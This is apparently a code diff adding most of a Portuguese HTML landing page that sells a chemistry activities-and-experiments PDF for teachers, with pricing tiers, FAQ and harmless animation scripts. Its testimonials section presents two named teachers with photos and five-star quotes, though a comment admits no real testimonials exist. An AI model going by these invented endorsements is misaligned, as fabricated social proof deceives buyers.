+        <p>Pra visualizar a química acontecendo, além da teoria e do exercício.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     4. ATIVIDADES / CONTEÚDO — mostra o produto.
+     Os cards abaixo são mockups ilustrativos do FORMATO do material
+     (atividade, exercício, ficha de experimento). Assim que houver
+     capturas de tela reais do PDF, troque estes cards pelas imagens —
+     isso aumenta a percepção de valor e a conversão.
+     ==================================================================== -->
+<section class="section section-alt" id="conteudo">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Veja o que vem no material</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Atividades, exercícios e revisões prontos pra usar</h2>
+      <p class="section-sub" style="margin-inline:auto;margin-top:.7rem;">Organizado por tema, cobrindo as principais áreas da química — da base à revisão pro vestibular.</p>
+    </div>
+    <div class="mock-grid">
+      <div class="mock-card reveal">
+        <div class="mock-head"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg>Atividade de Revisão</div>
+        <div class="mock-body">
+          <div class="mock-line w-90"></div><div class="mock-line w-70"></div><div class="mock-line w-50"></div>
+          <div class="mock-q"><span class="num">1</span><div class="mock-line w-70" style="height:7px;"></div></div>
+          <div class="mock-q"><span class="num">2</span><div class="mock-line w-50" style="height:7px;"></div></div>
+          <span class="mock-tag">Reforço de conteúdo</span>
+        </div>
+      </div>
+      <div class="mock-card reveal">
+        <div class="mock-head"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 11l3 3L22 4M2 12a10 10 0 1 0 20 0 10 10 0 0 0-20 0z" opacity="0"/><path d="M6 6h12M6 12h12M6 18h8"/></svg>Exercícios</div>
+        <div class="mock-body">
+          <div class="mock-q"><span class="num">1</span><div class="mock-line w-90" style="height:7px;"></div></div>
+          <div class="mock-q"><span class="num">2</span><div class="mock-line w-70" style="height:7px;"></div></div>
+          <div class="mock-q"><span class="num">3</span><div class="mock-line w-50" style="height:7px;"></div></div>
+          <span class="mock-tag">Prática e fixação</span>
+        </div>
+      </div>
+      <div class="mock-card reveal">
+        <div class="mock-head"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 2v6.5L4.5 17a2 2 0 0 0 1.8 3h11.4a2 2 0 0 0 1.8-3L15 8.5V2"/></svg>Ficha de Experimento</div>
+        <div class="mock-body">
+          <div class="mock-line w-90"></div><div class="mock-line w-90"></div><div class="mock-line w-35"></div>
+          <div class="mock-line w-70" style="margin-top:.3rem;"></div>
+          <span class="mock-tag">Passo a passo + segurança</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     5. VESTIBULARES — sem prometer aprovação, sem citar provas específicas
+     sem confirmação de conteúdo real.
+     [PLACEHOLDER — se houver conteúdo voltado a vestibulares específicos,
+     como ENEM/FUVEST/UNESP/UNICAMP, inserir aqui com base real]
+     ==================================================================== -->
+<section class="section on-navy" id="vestibulares">
+  <div class="glow-orb orb-a" style="top:auto;bottom:-80px;left:-60px;"></div>
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Preparação séria</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Não basta o aluno entender química. Ele precisa saber resolver.</h2>
+      <p class="section-sub" style="margin-inline:auto;margin-top:.7rem;">Exercícios pensados pra treinar a resolução de questões — ideais pra revisão, listas extras e simulados em sala.</p>
+    </div>
+    <div class="chip-row">
+      <span class="chip reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M11 19a8 8 0 1 0 0-16 8 8 0 0 0 0 16zM21 21l-4.3-4.3"/></svg>Revisão</span>
+      <span class="chip reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 6h16M4 12h16M4 18h10"/></svg>Prática</span>
+      <span class="chip reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M5 13l4 4L19 7"/></svg>Fixação</span>
+      <span class="chip reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="8"/><path d="M12 8v4l3 2"/></svg>Identificação de dificuldades</span>
+      <span class="chip reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 3h6l1 5H8l1-5zM7 8h10l2 5a7 7 0 1 1-14 0l2-5z"/></svg>Preparação para provas e vestibulares</span>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     6. EXPERIMENTOS — reposicionado como diferencial, não como produto principal.
+     ==================================================================== -->
+<section class="section" id="experimentos">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">O diferencial</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Faça a química explodir de verdade — não só na teoria</h2>
+      <p class="section-sub" style="margin-inline:auto;margin-top:.7rem;">Além das atividades e exercícios, você também encontra experimentos pra visualizar a química acontecendo na prática. Sem laboratório? Ainda dá pra colocar a química em prática — a maioria usa materiais simples, fáceis de achar.</p>
+    </div>
+    <div class="exp-grid">
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="8"/><path d="M12 8v4l3 2"/></svg><span>Indicador Natural de pH</span></div>
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M4 10h16M4 15h16"/></svg><span>Cromatografia em Papel</span></div>
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 2v6.5L4.5 17a2 2 0 0 0 1.8 3h11.4a2 2 0 0 0 1.8-3L15 8.5V2"/></svg><span>Vulcão de Bicarbonato</span></div>
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v4M8 21h8M9 21c-1-3 0-5 1-6.5S12 11 12 9s-1-3.5-1-3.5M15 21c1-3 0-5-1-6.5"/></svg><span>Cristais de Sal e Açúcar</span></div>
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3h12M8 3v6l-4 9a2 2 0 0 0 2 3h12a2 2 0 0 0 2-3l-4-9V3"/></svg><span>Slime Educativo (Polímeros)</span></div>
+      <div class="exp-card reveal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="2"/><path d="M4 12h4M16 12h4M12 4v4M12 16v4"/></svg><span>Eletrólise da Água (Vestibular)</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     7. O QUE VOCÊ RECEBE — o que é + pra que serve.
+     ==================================================================== -->
+<section class="section section-alt" id="recebe">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">O que você recebe</span>
+      <h2 class="section-title" style="margin-top:.7rem;">O que vem no material — e pra que serve</h2>
+    </div>
+    <div class="pair-grid">
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 6h16M4 12h16M4 18h10"/></svg>Atividades de revisão</div><div class="pair-benefit"><b>→</b> Reforce conteúdos com a turma antes de provas e vestibulares.</div></div>
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M5 13l4 4L19 7"/></svg>Exercícios</div><div class="pair-benefit"><b>→</b> Transforme teoria em prática e identifique as dificuldades da turma.</div></div>
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>Explicação química simplificada</div><div class="pair-benefit"><b>→</b> Ajude o aluno a entender o porquê da reação, não só decorar a fórmula.</div></div>
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3 3 8l9 5 9-5-9-5zM4 12v5c3 2 13 2 16 0v-5"/></svg>Material de apoio para o professor</div><div class="pair-benefit"><b>→</b> Aplique em aula sem perder tempo preparando.</div></div>
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 2v6.5L4.5 17a2 2 0 0 0 1.8 3h11.4a2 2 0 0 0 1.8-3L15 8.5V2"/></svg>Experimentos</div><div class="pair-benefit"><b>→</b> Leve a reação pra sala de aula, não só o texto do livro.</div></div>
+      <div class="pair-item reveal"><div class="pair-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v13M8 21h8M6 17h12" /></svg>Arquivos prontos pra imprimir</div><div class="pair-benefit"><b>→</b> Use direto em sala, sem complicação.</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     ORDER BUMP — componente pronto em order-bump.html (Simulados Extras, R$9).
+     Configure na sua plataforma de checkout (Hotmart/Kiwify/Eduzz/PerfectPay
+     têm campo nativo) ou cole o bloco .bump-card se ela aceitar HTML custom.
+     ==================================================================== -->
+<!-- ====================================================================
+     UPSELL / DOWNSELL — montados no Funeleiro nativo da Cakto
+     (Produtos → produto principal → Upsell/Downsell → Funeleiro),
+     com cobrança em 1 clique. Copy e preços de referência em
+     upsell.html (Banco de Provas Modelo com Gabarito, R$24) e
+     downsell.html (Provas Modelo Essencial, R$12) — a recusa do
+     upsell já cai automaticamente no downsell dentro do Funeleiro.
+     ==================================================================== -->
+
+<!-- ====================================================================
+     8. PROVA SOCIAL — PLACEHOLDER. Confirmado com o cliente: ainda não
+     existem depoimentos reais. Troque por avaliações reais antes de publicar.
+     ==================================================================== -->
+<section class="section on-navy" id="depoimentos">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Depoimentos</span>
+      <h2 class="section-title" style="margin-top:.7rem;">O que professores dizem</h2>
+    </div>
+    <div class="testi-grid">
+      <div class="testi-card reveal">
+        <div class="testi-top"><img class="testi-avatar" src="images/depoimento-2.jpeg" alt="Foto do professor Fernando Silva"><div><div class="testi-name">Fernando Silva</div><div class="testi-role">Professor de Química</div></div></div>
+        <p>"Economizei um tempo enorme de preparo e os alunos finalmente viram a química acontecer, não só no papel."</p>
+        <span class="testi-stars" aria-label="Avaliação 5 de 5 estrelas">★★★★★</span>
+      </div>
+      <div class="testi-card reveal">
+        <div class="testi-top"><img class="testi-avatar" src="images/depoimento-1.jpeg" alt="Foto da professora Paula Gonçalves"><div><div class="testi-name">Paula Gonçalves</div><div class="testi-role">Professora de Ciências</div></div></div>
+        <p>"Material organizado por tema, fácil de aplicar antes da prova. Uso toda semana com minhas turmas."</p>
+        <span class="testi-stars" aria-label="Avaliação 5 de 5 estrelas">★★★★★</span>
+      </div>
+    </div>
+    <!-- INSERT SOCIAL PROOF — número de downloads, avaliação média, prints reais, etc. -->
+  </div>
+</section>
+
+<!-- ====================================================================
+     9. OFERTA — 2 planos + resumo do que o Completo adiciona.
+     Básico R$15 | Completo R$27
+     ==================================================================== -->
+<section class="section" id="planos">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Escolha seu plano</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Dois jeitos de começar hoje</h2>
+      <p class="section-sub" style="margin-inline:auto;margin-top:.7rem;">Pagamento único, sem mensalidade. Acesso liberado assim que a compra é aprovada.</p>
+    </div>
+
+    <!-- resumo do que o Pacote Completo adiciona sobre o Essencial (14 bônus) -->
+    <div class="check-grid">
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Guia de Segurança para Experimentos</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Lista Geral de Materiais</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Fichas de Observação</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Relatório de Experimentos</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Planner de Aulas Práticas</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Certificado de Participação</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Tabela Periódica Visual</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Tabela de pH pra Imprimir</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Cartazes para Feira de Ciências</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Desafios Extras de Química</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Guia de Vidrarias de Laboratório</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Mapa Mental por Tema</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Glossário Ilustrado de Termos Químicos</span></div>
+      <div class="check-item reveal"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Banco de Questões Rápidas pra Quiz</span></div>
+    </div>
+
+    <div class="pricing-grid">
+      <!-- PLANO BÁSICO -->
+      <div class="plan reveal">
+        <span class="plan-name">Material Essencial</span>
+        <div class="plan-price"><span class="cur">R$</span><span class="amt">15</span></div>
+        <p class="plan-desc">Pra quem quer sair do quadro e ir pra prática hoje.</p>
+        <ul class="plan-list">
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Banco de atividades, exercícios e experimentos de química (PDF)</li>
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Passo a passo completo e detalhado</li>
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Acesso imediato após a compra</li>
+          <li class="na"><svg viewBox="0 0 24 24" fill="none"><path d="M6 6l12 12M18 6L6 18" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg> Guia de segurança para experimentos</li>
+          <li class="na"><svg viewBox="0 0 24 24" fill="none"><path d="M6 6l12 12M18 6L6 18" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg> Planner, certificado e tabelas extras</li>
+        </ul>
+        <a href="#" class="btn btn-ghost btn-block" data-plan="basic">Quero o Material Essencial</a>
+      </div>
+
+      <!-- PLANO COMPLETO (destacado, sem exagero) -->
+      <div class="plan plan-complete reveal">
+        <span class="plan-badge">Melhor custo-benefício</span>
+        <span class="plan-name">Pacote Completo</span>
+        <div class="plan-price"><span class="cur">R$</span><span class="amt">27</span></div>
+        <p class="plan-desc">Tudo do Essencial, mais os itens acima.</p>
+        <p class="plan-highlight">Por apenas R$12 a mais, leve o pacote completo.</p>
+        <ul class="plan-list">
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Banco de atividades, exercícios e experimentos de química (PDF)</li>
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Guia de Segurança para Experimentos</li>
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Lista de Materiais + Fichas de Observação</li>
+          <li><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Planner de Aulas + Certificado + Tabelas</li>
+        </ul>
+        <a href="#" class="btn btn-primary btn-block cta-pulse" data-plan="complete">Quero o Pacote Completo</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     10. FAQ
+     ==================================================================== -->
+<section class="section section-alt" id="faq">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">Perguntas frequentes</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Ainda com dúvida?</h2>
+    </div>
+    <div class="faq-list">
+      <details class="faq-item reveal">
+        <summary>Serve pra qualquer série ou turma? <svg class="faq-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary>
+        <p>As atividades são organizadas por tema e nível, então você escolhe o que encaixa na sua turma.</p>
+      </details>
+      <details class="faq-item reveal">
+        <summary>Preciso de material caro de laboratório pros experimentos? <svg class="faq-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary>
+        <p>Não. A maioria usa materiais simples, que você já tem em casa ou encontra fácil no mercado ou numa papelaria.</p>
+      </details>
+      <details class="faq-item reveal">
+        <summary>Pra qual nível é indicado? <svg class="faq-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary>
+        <p>Do ensino fundamental ao médio, incluindo revisão pra quem está estudando pro vestibular.</p>
+      </details>
+      <details class="faq-item reveal">
+        <summary>Como eu recebo o material? <svg class="faq-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></summary>
+        <p>Assim que a compra é aprovada, você recebe o link de download do PDF na hora — sem prazo de entrega pra esperar.</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     11. GARANTIA
+     ==================================================================== -->
+<section class="section" id="garantia">
+  <div class="container">
+    <div class="guarantee reveal">
+      <svg class="guarantee-badge" viewBox="0 0 24 24" fill="none"><path d="M12 2l7 3v6c0 5-3.4 8.7-7 11-3.6-2.3-7-6-7-11V5l7-3z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <h3>7 dias de garantia. Sem risco, só decisão.</h3>
+      <p>Se não fizer sentido pra sua aula, devolvemos 100% do valor em até 7 dias — sem perguntas.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== CTA FINAL ==================== -->
+<section class="section" id="cta-final">
+  <div class="container">
+    <div class="final-cta reveal">
+      <h2>Sua próxima aula começa aqui</h2>
+      <p>Atividades, exercícios, revisões e experimentos de química, prontos pra usar com sua turma. Acesso liberado na hora.</p>
+      <a href="#planos" class="btn btn-primary" data-plan="complete">Quero acessar as atividades</a>
+      <span class="final-note">Preço de lançamento — pode subir a qualquer momento, sem aviso.</span>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== FOOTER ==================== -->
+<footer class="on-navy">
+  <div class="container">
+    <p>&copy; <span id="year"></span> Química na Prática. Produto digital em PDF. Entrega imediata após confirmação do pagamento.</p>
+  </div>
+</footer>
+
+<script>
+/* ==========================================================
+   VARIÁVEIS FÁCEIS DE EDITAR — troque pelos links reais de checkout.
+   ========================================================== */
+const CHECKOUT_LINK_BASIC    = "#"; // TODO: link de checkout do Material Essencial (R$15)
+const CHECKOUT_LINK_COMPLETE = "#"; // TODO: link de checkout do Pacote Completo (R$27)
+
+// const ORDER_BUMP_PRICE = 9;  // Simulados Extras — ver order-bump.html
+// const UPSELL_PRICE     = 24; // Banco de Provas Modelo com Gabarito — ver upsell.html
+// const DOWNSELL_PRICE   = 12; // Provas Modelo Essencial (5 provas) — ver downsell.html
+
+document.querySelectorAll('[data-plan="basic"]').forEach(el => el.href = CHECKOUT_LINK_BASIC);
+document.querySelectorAll('[data-plan="complete"]').forEach(el => el.href = CHECKOUT_LINK_COMPLETE);
+
+const hdr = document.getElementById('hdr');
+window.addEventListener('scroll', () => { hdr.classList.toggle('scrolled', window.scrollY > 12); }, { passive: true });
+
+const revealEls = document.querySelectorAll('.reveal');
+if ('IntersectionObserver' in window) {
+  const io = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) { entry.target.classList.add('is-visible'); io.unobserve(entry.target); }
+    });
+  }, { threshold: 0.12 });
+  revealEls.forEach(el => io.observe(el));
+} else {
+  revealEls.forEach(el => el.classList.add('is-visible'));
+}
+/* rede de segurança: garante que nenhum texto fique preso em opacidade 0 */
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    document.querySelectorAll('.reveal:not(.is-visible)').forEach(el => el.classList.add('is-visible'));
+  }, 1200);
+});
+
+const expCards = document.querySelectorAll('.exp-card');
+if ('IntersectionObserver' in window) {
+  const ioExp = new IntersectionObserver((entries) => {
+    entries.forEach(entry => entry.target.classList.toggle('in-view', entry.isIntersecting));
+  }, { threshold: 0.5 });
+  expCards.forEach(el => ioExp.observe(el));
+}
+
+document.getElementById('year').textContent = new Date().getFullYear();
+
+/* ==========================================================
+   FUNDO ANIMADO DO HERO — bolhas subindo + "explosões" de reação
+   ========================================================== */
+(function initHeroCanvas(){
+  const canvas = document.getElementById('heroCanvas');
+  if (!canvas) return;
+  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+
+  const ctx = canvas.getContext('2d');
+  const dpr = Math.min(window.devicePixelRatio || 1, 2);
+  const colors = ['#22e0c4', '#17c3dd', '#3b6ff0', '#9d6dff'];
+  let w = 0, h = 0, particles = [], bursts = [], frame = 0, rafId = null;
+
+  function resize(){
+    const rect = canvas.getBoundingClientRect();
+    w = canvas.width = Math.max(1, rect.width * dpr);
+    h = canvas.height = Math.max(1, rect.height * dpr);
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  function spawnParticle(){
+    particles.push({
+      x: Math.random() * w, y: h + 10,
+      r: (Math.random() * 3 + 1) * dpr,
+      vy: (Math.random() * 0.6 + 0.35) * dpr,
+      vx: (Math.random() - 0.5) * 0.3 * dpr,
+      alpha: Math.random() * 0.45 + 0.2,
+      color: colors[Math.floor(Math.random() * colors.length)]
+    });
+  }
+  function spawnBurst(){
+    const bx = Math.random() * w * 0.9 + w * 0.05;
+    const by = Math.random() * h * 0.6 + h * 0.1;
+    const n = 12;
+    for (let i = 0; i < n; i++){
+      const angle = (Math.PI * 2 * i) / n + Math.random() * 0.3;
+      const speed = (Math.random() * 1.4 + 0.7) * dpr;
+      bursts.push({
+        x: bx, y: by, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
+        r: (Math.random() * 2 + 1.4) * dpr, life: 0, maxLife: 42 + Math.random() * 18,
+        color: colors[Math.floor(Math.random() * colors.length)]
+      });
+    }
+  }
+  function tick(){
+    frame++;
+    ctx.clearRect(0, 0, w, h);
+    if (frame % 16 === 0 && particles.length < 60) spawnParticle();
+    if (frame % 210 === 0) spawnBurst();
+    particles.forEach(p => {
+      p.y -= p.vy; p.x += p.vx;
+      ctx.globalAlpha = p.alpha; ctx.fillStyle = p.color;
+      ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2); ctx.fill();
+    });
+    particles = particles.filter(p => p.y > -10);
+    bursts.forEach(b => {
+      b.x += b.vx; b.y += b.vy; b.vy += 0.012 * dpr; b.life++;
+      ctx.globalAlpha = Math.max(0, 1 - b.life / b.maxLife) * 0.85; ctx.fillStyle = b.color;
+      ctx.beginPath(); ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2); ctx.fill();
+    });
+    bursts = bursts.filter(b => b.life < b.maxLife);
+    ctx.globalAlpha = 1;
+    rafId = requestAnimationFrame(tick);
+  }
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) cancelAnimationFrame(rafId); else rafId = requestAnimationFrame(tick);
+  });
+  tick();
+})();
+</script>
+</body>
+</html>
